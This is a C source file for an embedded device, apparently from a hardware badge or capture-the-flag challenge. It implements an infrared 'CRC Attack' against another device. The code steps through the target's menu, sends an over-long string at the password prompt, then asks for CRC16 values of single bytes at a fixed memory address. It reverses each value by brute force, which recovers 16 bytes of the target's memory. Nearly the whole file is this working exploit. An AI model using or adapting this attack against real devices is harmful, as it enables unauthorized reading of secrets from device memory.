/* ************************************************************************** */
/** Descriptive File Name

  @Company
    Company Name

  @File Name
    filename.c

  @Summary
    Brief description of the file.

  @Description
    Describe the purpose of this file.
 */
/* ************************************************************************** */

/* ************************************************************************** */
/* ************************************************************************** */
/* Section: Included Files                                                    */
/* ************************************************************************** */
/* ************************************************************************** */

/* This section lists the other files that are included in this file.
 */
#include "ir.h"
#include "string.h"
#include "util.h"
#include <stdio.h>
#include "lcd_menu.h"
#include <ctype.h>

#define CACHE_SIZE 64
#define CRC_ATTACK_ADDRESS 0x200059f0

typedef struct {
    uint8_t crcAttackState;
    uint32_t address;
    uint8_t buffer[16]; // Buffer to store the guessed input bytes
    uint16_t crc[16]; // Buffer to store CRC values
    uint8_t index;
} CRC_State_t;

CRC_State_t crcState;

typedef struct {
    uint16_t crc;
    uint8_t input_byte;
} CacheEntry;

CacheEntry crc_cache[CACHE_SIZE];

static void InitCache() {
    for (int i = 0; i < CACHE_SIZE; ++i) {
        crc_cache[i].crc = 0xFFFF; // Use 0xFFFF as an invalid value
    }
}

static bool FindInCache(uint16_t crc, uint8_t *output) {
    for (int i = 0; i < CACHE_SIZE; ++i) {
        if (crc_cache[i].crc == crc) {
            *output = crc_cache[i].input_byte;
            return true;
        }
    }
    return false;
}

static void AddToCache(uint16_t crc, uint8_t input_byte) {
    static int next_cache_index = 0;
    crc_cache[next_cache_index].crc = crc;
    crc_cache[next_cache_index].input_byte = input_byte;
    next_cache_index = (next_cache_index + 1) % CACHE_SIZE;
}

static bool GuessInputByte(uint16_t target_crc, uint8_t *output_byte) {
    for (uint16_t i = 0; i < 256; ++i) {
        uint8_t guess = (uint8_t)i;
        if (UTIL_crc16_CCITT(&guess, 1) == target_crc) {
            *output_byte = guess;
            return true;
        }
    }
    return false;
}

static void GetCrcByte(uint16_t crc, uint8_t *output) {
    if (FindInCache(crc, output)) {
        return;
    }

    if (GuessInputByte(crc, output)) {
        AddToCache(crc, *output);
    } else {
        // Handle the case where no input byte was found to match the given CRC
        *output = 0;
    }
}
 
void CRC_ATTACK_Run() {
   
    char command[20];
 
    switch (crcState.crcAttackState) {
        case 0:
            //waiting to start
            break;
        case 1:
            printf("\nCRC Attack on IR:\n");
            crcState.crcAttackState = 2;
            crcState.index = 0;
            crcState.address = CRC_ATTACK_ADDRESS;
            break;
        case 2:
            //Force menu to known state
            IR_SendMessage("\n", 0, NULL);
            SYSTICK_DelayMs(500);
            IR_SendMessage("\n", 0, NULL);
            SYSTICK_DelayMs(500);
            crcState.crcAttackState = 3;
            break;
        case 3:          
            if(!IR_SendMessage("1", 3, "password")) {
                crcState.crcAttackState = -1;
                break;
            }            
            crcState.crcAttackState = 4;
            break;
        case 4:                    
            if(!IR_SendMessage("012345678901234567890123456789012345678901234567890123456789012", 9, "Invalid Password!")) {
                printf("failed all\n");
                IR_SendMessage("\n", 0, NULL);
                IR_SendMessage("\n", 0, NULL);
                crcState.crcAttackState = 3;
                break;
            }                 
            crcState.crcAttackState = 5;
            break;
        case 5 ... 20:  
            //run crc
            if(!IR_SendMessage("c", 5, "length:")) {
                crcState.crcAttackState = -1;
                break;
            }
            
            snprintf(command, sizeof(command), "0x%08x 1", (unsigned int)crcState.address); // 1 byte at a time

            printf("command: %s\n", command);
            if(!IR_SendMessage(command, 5, "CRC:")) {
                printf("failed all\n");
                IR_SendMessage("\n", 0, NULL);
                IR_SendMessage("\n", 0, NULL);
                //crcState.crcAttackState = -1;
                break;
            }

            crcState.crc[crcState.index] = (uint16_t) strtol((char *)(ir_packet.buffer + 5), NULL, 16);
            uint8_t output;
            GetCrcByte(crcState.crc[crcState.index], &output);
            crcState.buffer[crcState.index] = output;
            snprintf((char *)&ir_packet.buffer[9], 6, " (%c)", isprint(output) ? output : '.');

            
            crcState.index++;
            crcState.crcAttackState++;
            crcState.address++;

            break;
        case 21:
            for (int i = 0; i < 16; i++) {
                uint8_t byte = crcState.buffer[i];
                ir_packet.buffer[i] = isprint(byte) ? byte : '.';
            }
            // Ensure null termination if ir_packet.buffer is expected to be a string
            ir_packet.buffer[16] = '\0';

            UTIL_PrintHexPlusASCII(crcState.buffer, 16, 0);
            
            printf("Done\n");
            crcState.crcAttackState = 0;
            
            break;
        default:
            printf("Error State\n");
            crcState.crcAttackState = 0;
            
            break;
    }
    
    if(crcState.crcAttackState != 0 && ir_packet.valid_packet == false) {
        strcpy((char *)ir_packet.buffer, "waiting...");
    }

    return;
}

void CRC_ATTACK_Start() {
    crcState.crcAttackState = 1;
}

void CRC_ATTACK_UI() {

	static char * temp = "CRC Attack:";
	
    InitCache();
    
	LCD_MENU_DisplayTextBuffer(temp, 0);
    LCD_MENU_DisplayTextBuffer((char *)ir_packet.buffer, 1);

	LCD_MENU_EnterSubMenu();

	CRC_ATTACK_Start();

	return;
}

/* *****************************************************************************
 End of File
 */
